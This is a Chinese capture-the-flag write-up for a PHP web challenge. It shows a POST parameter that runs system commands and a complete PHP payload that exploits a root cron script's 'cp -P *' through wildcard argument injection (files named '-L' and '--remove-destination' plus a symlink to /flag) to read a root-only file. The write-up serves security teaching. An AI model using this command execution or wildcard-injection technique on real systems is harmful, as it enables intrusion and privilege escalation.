## 放开我的变量

### 题目描述

```text
本人不太喜欢 PHP 8（）。
```

![题目页面](/images/uploads/ctf-weekly-challenge-1-15.png)

我特别喜欢看《棋魂》，当然这和题目没有关系。

先使用 dirsearch 扫描路径。

![dirsearch 扫描结果](/images/uploads/ctf-weekly-challenge-1-16.png)

访问 `robots.txt`，查看是否存在有用信息。

![robots.txt](/images/uploads/ctf-weekly-challenge-1-17.png)

访问 `/asdback.php`。

![asdback.php](/images/uploads/ctf-weekly-challenge-1-18.png)

发现了最终源码。以 POST 方式发送参数后，服务端会运行传入的 `cmd`：

```text
__0xGame2025phpPsAux=system('ls -la /');
```

传入后发现根目录存在 Flag，但它是普通文件，只有 root 才能读取。

![根目录文件权限](/images/uploads/ctf-weekly-challenge-1-19.png)

![权限限制](/images/uploads/ctf-weekly-challenge-1-20.png)

读取 `start.sh`，发现它做两件事：

1. 后台每 5 秒复制一次 `primary` 到 `marstream`。
2. 前台启动 Apache 网站服务。

```sh
cp -P * /var/www/html/marstream/
```

把 `primary` 里的内容复制到 `marstream`。

```sh
chmod 755 -R /var/www/html/marstream/
```

把 `marstream` 里的内容改成所有用户都可读。

这个 root 脚本每 5 秒都会把 `primary` 目录里的内容复制到 `marstream` 目录。

借助这个脚本可以进行通配符注入。本来 `-L` 只是一个文件名，但 `cp` 会把它当成命令参数。

`cp -P` 表示：如果复制的是符号链接，不要追踪真实目标，只复制链接本身。

`cp -L` 表示：如果遇到符号链接，要跟随链接读取真实文件内容。

```php
@unlink('/var/www/html/primary/-L');@unlink('/var/www/html/primary/--remove-destination');@unlink('/var/www/html/primary/flag');touch('/var/www/html/primary/-L');touch('/var/www/html/primary/--remove-destination');symlink('/flag','/var/www/html/primary/flag');echo 'ok';
```

![构造符号链接](/images/uploads/ctf-weekly-challenge-1-21.png)

逐句解释：

### `@unlink('/var/www/html/primary/-L');`

删除旧的 `-L` 文件。如果之前已经创建过，再次创建可能报错；`@` 的作用是忽略错误显示。

### `@unlink('/var/www/html/primary/flag');`

删除旧的 `flag` 文件，避免文件冲突。

### `touch('/var/www/html/primary/-L');`

创建一个名为 `-L` 的空文件，内容无所谓，文件名才是关键。

### `symlink('/flag','/var/www/html/primary/flag');`

创建符号链接：

```text
/var/www/html/primary/flag -> /flag
```

也就是在 `primary` 目录中放置一个指向真正 `/flag` 文件的链接。

### `echo 'ok';`

输出执行成功提示。

执行后，`primary` 目录大致如下：

```text
-L
flag -> /flag
```

root 脚本随后执行：

```sh
cp -P -L flag /var/www/html/marstream/
```

于是 root 会读取 `/flag`，并将内容复制到 `/var/www/html/marstream/flag`，之后访问 `/marstream/flag` 即可读取。

![访问复制后的文件](/images/uploads/ctf-weekly-challenge-1-22.png)

得到 Flag。
